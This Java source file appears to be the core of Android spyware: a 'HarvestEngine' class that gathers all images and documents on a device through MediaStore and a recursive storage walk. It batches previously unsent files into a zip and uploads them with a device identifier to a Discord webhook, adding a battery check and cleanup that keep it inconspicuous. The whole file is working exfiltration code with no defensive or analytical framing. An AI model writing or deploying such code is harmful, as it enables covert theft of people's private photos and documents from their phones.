package com.example.harvester;

import android.content.ContentUris;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class HarvestEngine {

    static class Item {
        Uri uri; String name; long size; String sig;
        Item(Uri u, String n, long s, String g) { uri = u; name = n; size = s; sig = g; }
    }

    public static void run(Context ctx) {
        // ---- battery guard ----
        BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        if (bm != null) {
            int pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            if (pct >= 0 && pct < Config.MIN_BATTERY_PCT) return;
        }

        List<Item> items = new ArrayList<>();

        // ---- 1) all images ----
        collect(ctx, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, items);

        // ---- 2) documents by MIME ----
        StringBuilder sel = new StringBuilder(MediaStore.MediaColumns.MIME_TYPE + " IN (");
        String[] args = new String[Config.DOC_MIMES.length];
        for (int i = 0; i < Config.DOC_MIMES.length; i++) {
            sel.append(i == 0 ? "?" : ",?");
            args[i] = Config.DOC_MIMES[i];
        }
        sel.append(")");
        collect(ctx, MediaStore.Files.getContentUri("external"), sel.toString(), args, items);

        // ---- 3) folder walk (only if "All files access" granted) ----
        if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
            walkFs(new File("/storage/emulated/0"), items, 0);
        }

        // ---- keep only NEW files ----
        SharedPreferences sp = ctx.getSharedPreferences("sent", Context.MODE_PRIVATE);
        Set<String> seen = new HashSet<>(sp.getStringSet("sigs", new HashSet<String>()));
        List<Item> fresh = new ArrayList<>();
        long total = 0;
        for (Item it : items) {
            if (seen.contains(it.sig)) continue;
            fresh.add(it);
            total += it.size;
            if (fresh.size() >= Config.MAX_FILES || total >= Config.MAX_MB_PER_CYCLE) break;
        }
        if (fresh.isEmpty()) return;

        // ---- zip ----
        File zip = new File(ctx.getCacheDir(), "h" + System.currentTimeMillis() + ".zip");
        try {
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zip));
            byte[] buf = new byte[8192];
            int idx = 0;
            for (Item it : fresh) {
                try {
                    InputStream in = ctx.getContentResolver().openInputStream(it.uri);
                    if (in == null) continue;
                    zos.putNextEntry(new ZipEntry(idx++ + "_" + it.name.replaceAll("[\\\\/:*?\"<>|]", "_")));
                    int n;
                    while ((n = in.read(buf)) > 0) zos.write(buf, 0, n);
                    zos.closeEntry();
                    in.close();
                } catch (Throwable t) { /* skip one file */ }
            }
            zos.close();
        } catch (Throwable t) {
            return;
        }

        // ---- upload to Discord ----
        String dev = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
        String cap = "dev=" + (dev != null && dev.length() > 6 ? dev.substring(0, 6) : "?")
                   + " files=" + fresh.size()
                   + " mb=" + (total / 1024 / 1024);

        boolean ok = DiscordUploader.sendDocument(zip, Config.DISCORD_WEBHOOK, cap);
        zip.delete();  // always clean up
        if (ok) {
            Set<String> ns = new HashSet<>(seen);
            for (Item it : fresh) ns.add(it.sig);
            sp.edit().putStringSet("sigs", ns).apply();
        }
    }

    private static void collect(Context ctx, Uri base, String sel, String[] args, List<Item> out) {
        ContentResolver cr = ctx.getContentResolver();
        String[] proj = {
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_MODIFIED
        };
        Cursor c = null;
        try {
            c = cr.query(base, proj, sel, args, MediaStore.MediaColumns.DATE_MODIFIED + " DESC");
            if (c == null) return;
            while (c.moveToNext() && out.size() < Config.MAX_FILES * 2) {
                long id = c.getLong(0);
                String name = c.getString(1);
                long size = c.getLong(2);
                long mod = c.getLong(3);
                if (size <= 0 || size > Config.MAX_BYTES_PER_FILE) continue;
                if (name == null || name.isEmpty()) continue;
                out.add(new Item(ContentUris.withAppendedId(base, id), name, size, id + "|" + size + "|" + mod));
            }
        } catch (Throwable t) {
        } finally {
            if (c != null) c.close();
        }
    }

    private static void walkFs(File dir, List<Item> out, int depth) {
        if (depth > 6 || out.size() >= Config.MAX_FILES * 2) return;
        File[] fs = dir.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (f.isDirectory()) {
                String n = f.getName();
                if (n.equals("Android") || n.equals(".") || n.equals("..")) continue;
                walkFs(f, out, depth + 1);
            } else {
                String nm = f.getName().toLowerCase();
                boolean img = nm.endsWith(".jpg") || nm.endsWith(".jpeg") || nm.endsWith(".png")
                           || nm.endsWith(".webp") || nm.endsWith(".gif") || nm.endsWith(".heic");
                boolean doc = nm.endsWith(".pdf") || nm.endsWith(".doc") || nm.endsWith(".docx")
                           || nm.endsWith(".xls") || nm.endsWith(".xlsx") || nm.endsWith(".ppt")
                           || nm.endsWith(".pptx") || nm.endsWith(".txt");
                if (!img && !doc) continue;
                long size = f.length();
                if (size <= 0 || size > Config.MAX_BYTES_PER_FILE) continue;
                out.add(new Item(Uri.fromFile(f), f.getName(), size,
                        f.getPath() + "|" + size + "|" + f.lastModified()));
            }
        }
    }
}
